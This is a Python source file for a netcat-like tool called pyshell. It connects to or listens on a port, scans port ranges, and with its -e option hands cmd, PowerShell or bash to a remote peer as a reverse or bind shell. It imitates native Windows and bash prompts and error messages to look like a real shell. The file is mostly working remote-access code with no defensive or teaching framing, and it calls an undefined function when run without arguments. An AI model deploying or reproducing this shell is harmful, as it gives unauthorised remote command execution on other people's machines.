#!/usr/bin/python3

#!/usr/bin/python3

import sys
import socket
import getopt
import threading
import subprocess
import os

listen = False
execute = ''
target = ""
port = 0
zero = False
ver = False

if sys.platform == 'win32':
    clrf = b'\n'
else:
    clrf = b''


def usage():

    print("""Connect: pyshell.py -t hostname -p port[s] [-options]
Listen: pyshell.py -l -p port [-options]""")

    print("-h                  Display this help message")
    print("-l                  Listen on [host]:[port] for incoming connections")
    print("-p port[s]          Port for the connections")
    print("-e file             Execute file upon connection")
    print("-t add              Host for the ibound connection")
    print("-z                  Zero I/O mode (used in port scaning)")
    print("-v                  Verbose mode")

    sys.exit(0)


def exec_command(command, exe):
    command = command.rstrip()

    try:
        if exe == 'cmd' or 'cmd.exe' in exe or exe == '/bin/bash' or exe == '/bin/sh':
            out = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)+clrf
        else:
            out = subprocess.check_output([exe, command], stderr=subprocess.STDOUT, shell=True)+clrf

    except subprocess.CalledProcessError:
        if 'powershell' in exe:
            out = b"""%s : The term '%s' is not recognized as the name of a cmdlet, function, script file, or operable program. Check
the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ %s
+ ~~~~~~~
    + CategoryInfo          : ObjectNotFound: (%s:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
    
""" % (command.encode(), command.encode(), command.encode(), command.encode())
        elif 'cmd' in exe:
            out = b"'%s' is not recognized as an internal or external command,\noperable program or batch file.\n\n" % command.encode()
        elif exe == '/bin/bash' or exe == '/bin/sh':
            out = b"-bash: %s: command not found\n" % command.encode()
        else:
            out = b'\n'
            
    return out


def client_handler(client_socket, execute):
    if len(execute):
        if sys.platform == 'win32':
            if 'powershell' in execute:
                version = b'\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\n'
                client_socket.send(version + b'PS ' + os.getcwd().encode() + b'>')
            elif 'cmd' in execute:
                version = subprocess.check_output('ver', stderr=subprocess.STDOUT, shell=True) + b'(c) Microsoft Corporation. All rights reserved.\n\n'
                client_socket.send(version + os.getcwd().encode() + b'>')
            else:
                client_socket.send(b'\n')
        elif execute == '/bin/bash' or execute == '/bin/sh':
            loc = os.getcwd().split('/')
            if loc[1] == 'root':
                usr = 'root'
            else:
                usr = loc[2]
                client_socket.send(('\n%s@%s:%s# ' % (usr, socket.gethostname(), os.getcwd())).encode())
        else:
            client_socket.send(b'\n')

        while 1:
            try:
                cmd_buffer = client_socket.recv(1024)

                _str = cmd_buffer.decode()
                if not len(_str):
                    out = b'\n'

                if 'cmd' in execute or 'powershell' in execute or execute == '/bin/bash' or execute == '/bin/sh':
                    if _str[:4] == 'exit':
                        client_socket.close()
                        break

                    else:
                        if _str.replace(' ', '') == 'cd..' and sys.platform == 'win32':
                            oloc = ''
                            aloc = os.getcwd().split('\\')
                            i = 0
                            while i < len(aloc)-1:
                                oloc += aloc[i]+'/'
                                i += 1
                            os.chdir(oloc)
                            out = b'\n'
                        elif _str.replace(' ', '') == 'cd/' and sys.platform == 'win32':
                            oloc = os.getcwd().split('\\')[0]+'/'
                            os.chdir(oloc)
                            out = b'\n'
                        elif _str.replace(' ', '')[:2] == 'cd' and len(_str.replace(' ', '')) != 2:
                            try:
                                os.chdir(_str.replace('cd', '').replace(' ', ''))
                                out = clrf
                            except:
                                if 'cmd' in execute:
                                    out = b'The system cannot find the path specified.\n\n'
                                elif 'powershell' in execute:
                                    out = b"""cd : Cannot find path '%s' because it does not exist.
At line:1 char:1
+ cd %s
+ ~~~~~~~
    + CategoryInfo          : ObjectNotFound: (%s:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand

""" % (os.getcwd().encode()+b'\\'+_str.replace(' ', '').replace('cd', '').encode(), _str.replace(' ', '').replace('cd', '').encode(), os.getcwd().encode()+b'\\'+_str.replace(' ', '').replace('cd', '').encode())
                                else:
                                    out = b"-bash: cd: %s: No such file or directory\n" % _str.replace(' ', '').replace('cd', '').encode()
                        elif _str.replace(' ', '') == 'cd' and sys.platform != 'win32':
                            oloc = ''
                            aloc = os.getcwd().split('/')
                            i = 0
                            while i < 3:
                                oloc += aloc[i]+'/'
                                i += 1
                            os.chdir(oloc)
                            out = b''
                        else:
                            out = exec_command(_str, execute)
    
                    if sys.platform == 'win32':
                        if 'powershell' in execute:
                            client_socket.sendall(out + b'PS ' + os.getcwd().encode() + b'>')
                        else:
                            client_socket.sendall(out + os.getcwd().encode() + b'>')

                    else:
                        loc = os.getcwd().split('/')
                        if loc[1] == 'root':
                            usr = 'root'
                        else:
                            usr = loc[2]
                        client_socket.sendall(out + ('%s@%s:%s# ' % (usr, socket.gethostname(), os.getcwd())).encode())

                else:
                    out = exec_command(_str, execute)
                    client_socket.send(out + b'\n')

            except:
                client_socket.close()
                break


    else:
        while 1:
            try:
                data = client_socket.recv(4096).decode()

                buffer = input(data)
                if not len(buffer):
                    buffer = '\n'
                elif buffer[:4] == 'exit':
                    client_socket.send(b'exit')
                    client_socket.close()
                    break
                client_socket.send(buffer.encode())

            except:
                client_socket.close()
                break

    quit()


def client_send(target, port, exe):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target, port))

        print('(UNKNOWN) [%s] %s : connection successfully' % (target, port))

        if zero == True:
            client.close()
            
        else:
            try:
                client_thread = threading.Thread(target=client_handler, args=(client, exe))
                client_thread.start()
            except KeyboardInterrupt:
                print('^C')
                quit()

    except:
        if ver == True:
            print('(UNKNOWN) [%s] %s : connection failed' % (target, port))
        else:
            pass

def server_loop(port, exe):
    target = "0.0.0.0"
    print('Listening on %s ...' % port)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    try:
        client_socket, addr = server.accept()

        print('(UNKNOWN) [%s] %s : connection successfully' % (addr[0], addr[1]))

        try:
            client_thread = threading.Thread(target=client_handler, args=(client_socket, exe))
            client_thread.start()

        except KeyboardInterrupt:
            print('^C')
            quit()

    except:
        pass


def main():
    global listen
    global port
    global execute
    global target
    global zero
    global ver

    if not len(sys.argv[1:]):
        scan()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:zv", ["help", "listen", "execute",
                                                        "target", "port", "zero", "verbose"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h"):
            usage()
        elif o in ("-l", "l"):
            listen = True
        elif o in ("-e"):
            execute = a
        elif o in ("-t"):
            target = a
        elif o in ("-p"):
            port = a
        elif o in ("-z", "z"):
            zero = True
        elif o in ("-v", "v"):
            ver = True
        else:
            pass

    if not listen and len(target) and '-' in port:
        fport = int(port.split('-')[0])
        lport = int(port.split('-')[1])
        for p in range(fport, lport+1):
            _thread = threading.Thread(target=client_send, args=(target, p, execute))
            _thread.start()
            
    elif not listen and len(target) and port.isdigit() and 65536 > int(port) > 0:
        client_send(target, int(port), execute)

    elif listen:
        server_loop(int(port), execute)

    else:
        print('Invalid usage')
        usage()
 

main()
